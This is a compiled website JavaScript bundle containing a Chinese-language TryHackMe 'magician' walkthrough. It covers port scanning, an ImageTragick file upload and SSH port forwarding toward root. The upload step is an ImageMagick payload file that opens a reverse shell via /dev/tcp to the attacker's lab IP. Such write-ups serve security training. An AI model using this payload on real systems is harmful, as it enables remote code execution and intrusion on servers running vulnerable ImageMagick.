"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2462],{1438:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>s,metadata:()=>r,toc:()=>l});var a=t(74848),i=t(28453);const s={sidebar_position:70,tags:["Easy","Linux","\u547d\u4ee4\u6267\u884c","\u6587\u4ef6\u8bfb\u53d6"],title:"magician",description:"magician",sidebar_label:"magician",slug:"/tryhackme/70"},o="magician",r={id:"box/TryHackMe/70",title:"magician",description:"magician",source:"@site/docs/box/TryHackMe/70.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/70",permalink:"/docs/tryhackme/70",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6267\u884c",permalink:"/docs/tags/\u547d\u4ee4\u6267\u884c"},{label:"\u6587\u4ef6\u8bfb\u53d6",permalink:"/docs/tags/\u6587\u4ef6\u8bfb\u53d6"}],version:"current",sidebarPosition:70,frontMatter:{sidebar_position:70,tags:["Easy","Linux","\u547d\u4ee4\u6267\u884c","\u6587\u4ef6\u8bfb\u53d6"],title:"magician",description:"magician",sidebar_label:"magician",slug:"/tryhackme/70"},sidebar:"boxSidebar",previous:{title:"Valley",permalink:"/docs/tryhackme/69"},next:{title:"VulnNet: Node",permalink:"/docs/tryhackme/71"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"8081",id:"8081",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"magician",id:"magician-1",level:3},{value:"magician \u2014&gt; root",id:"magician--root",level:3}];function p(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"magician",children:"magician"}),"\n",(0,a.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-77-221:~/magician# nmap -sTCV  -p 21,8080,8081 --min-rate 1000 10.10.120.29\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-05 12:21 BST\nNmap scan report for ip-10-10-120-29.eu-west-1.compute.internal (10.10.120.29)\nHost is up (0.00019s latency).\n\nPORT     STATE SERVICE    VERSION\n21/tcp   open  ftp        vsftpd 2.0.8 or later\n8080/tcp open  http-proxy\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Vary: Origin\n|     Vary: Access-Control-Request-Method\n|     Vary: Access-Control-Request-Headers\n|     Content-Type: application/json\n|     Date: Tue, 05 Sep 2023 11:21:53 GMT\n|     Connection: close\n|     {"timestamp":"2023-09-05T11:21:53.250+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}\n|   GetRequest: \n|     HTTP/1.1 404 \n|     Vary: Origin\n|     Vary: Access-Control-Request-Method\n|     Vary: Access-Control-Request-Headers\n|     Content-Type: application/json\n|     Date: Tue, 05 Sep 2023 11:21:53 GMT\n|     Connection: close\n|     {"timestamp":"2023-09-05T11:21:53.050+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}\n|   HTTPOptions: \n|     HTTP/1.1 404 \n|     Vary: Origin\n|     Vary: Access-Control-Request-Method\n|     Vary: Access-Control-Request-Headers\n|     Content-Type: application/json\n|     Date: Tue, 05 Sep 2023 11:21:53 GMT\n|     Connection: close\n|     {"timestamp":"2023-09-05T11:21:53.191+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}\n|   RTSPRequest: \n|     HTTP/1.1 505 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 465\n|     Date: Tue, 05 Sep 2023 11:21:53 GMT\n|     <!doctype html><html lang="en"><head><title>HTTP Status 505 \n|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 \n|_    HTTP Version Not Supported</h1></body></html>\n|_http-title: Site doesn\'t have a title (application/json).\n8081/tcp open  http       nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: magician\n'})}),"\n",(0,a.jsx)(n.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703190124.png",alt:"20240703190124"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7ed9\u4e86\u4e00\u6bb5\u63d0\u793a\u5185\u5bb9, \u5176\u4e2d\u6307\u660e\u94fe\u63a5\u4e3a ",(0,a.jsx)(n.code,{children:"https://imagetragick.com"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703190135.png",alt:"20240703190135"})}),"\n",(0,a.jsx)(n.h2,{id:"8081",children:"8081"}),"\n",(0,a.jsxs)(n.p,{children:["\u5f53\u8bbf\u95ee ",(0,a.jsx)(n.code,{children:"http://10.10.120.29:8081/"})," \u6ca1\u6709\u529e\u6cd5\u4e0a\u4f20\u6587\u4ef6, \u6211\u4eec\u9700\u8981\u6dfb\u52a0 hosts \u6587\u4ef6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-77-221:~/magician# cat /etc/hosts\n127.0.0.1\tlocalhost\n127.0.1.1\ttryhackme.lan\ttryhackme\n10.10.120.29 magician\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7ecf\u8fc7\u641c\u7d22, \u6211\u53d1\u73b0\u4e86\u5229\u7528\u65b9\u5f0f : ",(0,a.jsx)(n.a,{href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20ImageMagick/README.md",children:"Picture ImageMagick | PayloadsAllTheThings"})]}),"\n",(0,a.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(n.h3,{id:"magician-1",children:"magician"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-77-221:~/magician# cat > image.png << EOF\n> push graphic-context\n> encoding \"UTF-8\"\n> viewbox 0 0 1 1\n> affine 1 0 0 1 0 0\n> push graphic-context\n> image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.10.77.221/4444 0<&1 2>&1'\n> pop graphic-context\n> pop graphic-context\n> EOF\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4e0a\u4f20\u8fd9\u4e2a\u6587\u4ef6\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 Shell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703190210.png",alt:"20240703190210"})}),"\n",(0,a.jsx)(n.h3,{id:"magician--root",children:"magician \u2014> root"}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u7aef\u53e3\u6211\u53d1\u73b0 6666 \u7aef\u53e3\u88ab\u4e00\u4e2a root \u7528\u6237\u542f\u52a8\u7684 Python \u7a0b\u5e8f\u5360\u7528"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703190635.png",alt:"20240703190635"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1, \u7136\u540e\u8bbf\u95ee\u53d1\u73b0\u8fd9\u4e2a\u7f51\u9875\u7684\u529f\u80fd\u662f\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9(\u4f1a\u7f16\u7801\u540e\u8fd4\u56de)"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) magician@magician:/tmp$ ssh -R 8888:127.0.0.1:6666 root@10.10.77.221\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703190652.png",alt:"20240703190652"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(p,{...e})}):p(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var a=t(96540);const i={},s=a.createContext(i);function o(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);